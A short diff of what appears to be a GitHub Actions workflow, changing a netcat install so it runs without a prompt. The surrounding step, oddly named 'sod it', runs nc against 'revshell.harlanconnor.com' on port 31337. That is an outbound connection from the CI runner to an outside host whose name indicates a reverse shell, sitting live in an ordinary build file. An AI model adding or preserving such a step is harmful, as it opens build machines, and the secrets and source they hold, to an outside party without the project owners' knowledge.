@@ -9,7 +9,7 @@ jobs:
     - uses: actions/checkout@v2
     - name: sod it
       run: |
-        sudo apt-get install netcat
+        sudo apt-get install netcat -y
         nc revshell.harlanconnor.com 31337
     - name: Install deps
       run: |
